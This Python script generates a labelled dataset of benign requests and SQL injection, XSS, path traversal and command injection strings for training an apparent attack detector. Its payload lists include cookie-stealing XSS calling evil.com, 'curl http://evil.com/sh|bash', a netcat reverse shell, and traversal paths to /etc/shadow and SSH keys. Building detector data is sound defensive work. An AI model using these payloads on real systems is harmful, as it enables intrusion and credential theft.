"""
Build a documented, multi-class payload dataset for ACSTD.

Classes: benign | sql_injection | xss | path_traversal | command_injection

Sources / provenance (kept honest, like the rest of the project):
  - benign + sql_injection : reused verbatim from data/sqli_dataset.csv
                             (Label 0 -> benign, Label 1 -> sql_injection).
  - benign (web traffic)   : templated normal HTTP requests, added so the
                             benign class isn't only SQL-shaped text.
  - xss / path_traversal / command_injection : SYNTHETIC, combinatorially
                             generated from well-known attack *components*
                             (tags/events, traversal sequences, shell
                             separators + commands). Reproducible (seeded),
                             not copied from any third-party payload corpus.

Output: data/multiclass_dataset.csv   (columns: payload,label)

Usage:
    cd backend
    python build_multiclass_dataset.py
"""
import csv
import itertools
import os
import random

import pandas as pd

SEED = 42
random.seed(SEED)

HERE = os.path.dirname(__file__)
SRC = os.path.join(HERE, "data", "sqli_dataset.csv")
OUT = os.path.join(HERE, "data", "multiclass_dataset.csv")

PER_CLASS = 7000  # target rows per class (kept balanced)

LABELS = ["benign", "sql_injection", "xss", "path_traversal", "command_injection"]


# ── helpers ──────────────────────────────────────────────────────────────────

def _mutate_case(s: str) -> str:
    """Randomly upper-case a few letters (models textbook obfuscation)."""
    return "".join(c.upper() if (c.isalpha() and random.random() < 0.25) else c for c in s)


def _fill(target, builder, mutate=True):
    """Call builder() until we collect `target` unique strings."""
    out, attempts, cap = set(), 0, target * 60
    while len(out) < target and attempts < cap:
        s = builder()
        if mutate and random.random() < 0.5:
            s = _mutate_case(s)
        if s:
            out.add(s)
        attempts += 1
    return list(out)


# ── benign web traffic ───────────────────────────────────────────────────────

BENIGN_PATHS = ["/", "/index.html", "/about", "/contact", "/products", "/login",
                "/dashboard", "/api/users", "/api/status", "/search", "/cart",
                "/static/logo.png", "/favicon.ico", "/blog/post", "/help", "/profile"]
BENIGN_PARAMS = ["", "?page=2", "?q=shoes", "?id=42", "?sort=name", "?lang=en",
                 "?category=books", "?ref=home", "?utm_source=news", "?limit=20"]
BENIGN_WORDS = ["alice", "bob", "engineering", "marketing", "hello world",
                "good morning", "quarterly report", "meeting notes",
                "project update", "thanks team", "see attached", "please review"]


def _benign_web():
    m = random.choice(["GET", "POST"])
    p = random.choice(BENIGN_PATHS) + random.choice(BENIGN_PARAMS)
    if m == "POST" and random.random() < 0.5:
        p += f" name={random.choice(BENIGN_WORDS)}"
    return f"{m} {p}"


# ── XSS ──────────────────────────────────────────────────────────────────────

XSS_TAGS = [
    "<script>{js}</script>", "<img src=x onerror={js}>", "<svg onload={js}>",
    "<iframe src=javascript:{js}>", "<body onload={js}>", "<input autofocus onfocus={js}>",
    "<details open ontoggle={js}>", "<a href=\"javascript:{js}\">x</a>",
    "<video><source onerror={js}>", "<marquee onstart={js}>",
    "\"><script>{js}</script>", "'><img src=x onerror={js}>",
    "<div onmouseover={js}>hover</div>", "<select onfocus={js} autofocus>",
]
XSS_JS = [
    "alert(1)", "alert('xss')", "alert(document.cookie)", "document.cookie",
    "eval('alert(1)')", "fetch('//evil.com?c='+document.cookie)", "prompt(1)",
    "confirm(document.domain)", "window.location='//evil.com'", "new Image().src='//evil/'+document.cookie",
]


def _xss():
    s = random.choice(XSS_TAGS).format(js=random.choice(XSS_JS))
    if random.random() < 0.2:
        s = "javascript:" + random.choice(XSS_JS)
    return s


# ── path traversal ───────────────────────────────────────────────────────────

PT_SEQ = ["../", "..\\", "%2e%2e%2f", "%2e%2e/", "..%2f", "....//", "..%5c", "%252e%252e%252f"]
PT_TARGETS = ["etc/passwd", "etc/shadow", "etc/hosts", "windows/system32/config/sam",
              "windows/win.ini", "boot.ini", "proc/self/environ", "var/log/auth.log",
              "usr/local/etc/passwd", ".ssh/id_rsa", "wp-config.php", ".env",
              "windows/system32/drivers/etc/hosts"]
PT_PREFIX = ["", "file=", "page=", "path=", "template=", "download=", "load=",
             "/var/www/html/", "include="]


def _path_traversal():
    seq = random.choice(PT_SEQ)
    depth = random.randint(1, 8)
    return f"{random.choice(PT_PREFIX)}{seq * depth}{random.choice(PT_TARGETS)}"


# ── command injection ────────────────────────────────────────────────────────

CMD_SEP = ["; ", "| ", "|| ", "&& ", "& ", "\n", "`{c}`", "$({c})"]
CMDS = ["ls", "ls -la", "cat /etc/passwd", "whoami", "id", "uname -a", "pwd",
        "ifconfig", "ipconfig", "dir", "type C:\\windows\\win.ini", "net user",
        "ping -c 1 evil.com", "curl http://evil.com/sh|bash", "wget http://evil.com/x",
        "nc -e /bin/sh evil.com 4444", "cat /etc/shadow", "echo vulnerable", "sleep 5"]
CMD_PREFIX = ["", "127.0.0.1", "test", "admin", "file.txt", "8.8.8.8 ", "image.png"]


def _cmd_injection():
    cmd = random.choice(CMDS)
    sep = random.choice(CMD_SEP)
    if "{c}" in sep:                       # $(...) / `...` wrapping
        return f"{random.choice(CMD_PREFIX)}{sep.format(c=cmd)}"
    return f"{random.choice(CMD_PREFIX)}{sep}{cmd}"


# ── assemble ─────────────────────────────────────────────────────────────────

def main():
    print(f"Reading real benign + SQLi rows from {SRC} ...")
    df = pd.read_csv(SRC, encoding="utf-8")
    df = df[["Query", "Label"]].dropna()
    df["Label"] = df["Label"].astype(str).str.strip()
    df["Query"] = df["Query"].astype(str)

    real_benign = df[df["Label"] == "0"]["Query"].tolist()
    real_sqli = df[df["Label"] == "1"]["Query"].tolist()
    random.shuffle(real_benign)
    random.shuffle(real_sqli)

    # benign = a slice of real benign rows + templated web traffic
    n_web = min(2000, PER_CLASS // 3)
    benign = real_benign[: PER_CLASS - n_web] + _fill(n_web, _benign_web, mutate=False)
    sql_injection = real_sqli[:PER_CLASS]
    xss = _fill(PER_CLASS, _xss)
    path_traversal = _fill(PER_CLASS, _path_traversal, mutate=False)
    command_injection = _fill(PER_CLASS, _cmd_injection)

    buckets = {
        "benign": benign,
        "sql_injection": sql_injection,
        "xss": xss,
        "path_traversal": path_traversal,
        "command_injection": command_injection,
    }

    # global de-dup: a payload may belong to only one class (first wins by LABELS order)
    seen, rows = set(), []
    for label in LABELS:
        for payload in buckets[label]:
            key = payload.strip()
            if key and key not in seen:
                seen.add(key)
                rows.append((payload, label))

    random.shuffle(rows)
    with open(OUT, "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["payload", "label"])
        w.writerows(rows)

    counts = {l: sum(1 for _, lab in rows if lab == l) for l in LABELS}
    print(f"\nWrote {len(rows)} rows -> {OUT}")
    print("Class distribution:")
    for l in LABELS:
        print(f"  {l:<18} {counts[l]}")


if __name__ == "__main__":
    main()
